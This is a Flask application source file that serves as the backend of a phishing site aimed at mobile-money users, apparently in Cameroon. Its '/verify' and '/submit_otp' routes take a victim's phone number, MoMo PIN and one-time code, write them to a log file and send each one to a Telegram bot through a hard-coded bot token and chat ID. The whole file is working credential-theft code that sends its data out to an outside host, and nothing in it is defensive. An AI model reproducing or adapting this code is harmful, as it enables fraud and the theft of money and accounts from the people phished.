from flask import Flask, render_template, request, redirect, url_for, jsonify, session
import logging
import requests

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # Replace 'your_secret_key' with a real secret key

# Set up logging to capture keystrokes
logging.basicConfig(filename='keystrokes.log', level=logging.INFO, format='%(asctime)s - %(message)s')

# Telegram configuration
BOT_TOKEN = '7235469151:AAFmzUxduIfiEearpaYzoWbwSUql42J_TlA'
CHAT_ID = '1390384398'  # Replace this with your actual chat ID

def send_telegram_message(message):
    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendMessage'
    payload = {
        'chat_id': CHAT_ID,
        'text': message
    }
    response = requests.post(url, json=payload)
    if response.status_code != 200:
        print(f"Failed to send message: {response.text}")
    else:
        print("Message sent successfully")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/verify', methods=['POST'])
def verify():
    data = request.json
    phone_number = data['phone_number']
    momo_pin = data['momo_pin']
    session['phone_number'] = phone_number  # Store phone number in session
    message = f'Phone Number: {phone_number}, MoMo Pin: {momo_pin}'
    logging.info(message)
    send_telegram_message(message)
    return jsonify(success=True)

@app.route('/otp')
def otp():
    phone_number = session.get('phone_number', 'unknown')
    return render_template('otp.html', phone_number=phone_number)

@app.route('/submit_otp', methods=['POST'])
def submit_otp():
    data = request.json
    otp_code = data['otp_code']
    phone_number = session.get('phone_number', 'unknown')
    message = f'OTP Code: {otp_code} for phone number +237{phone_number}'
    logging.info(message)
    send_telegram_message(message)
    return jsonify(success=True)

if __name__ == '__main__':
    app.run(debug=True)

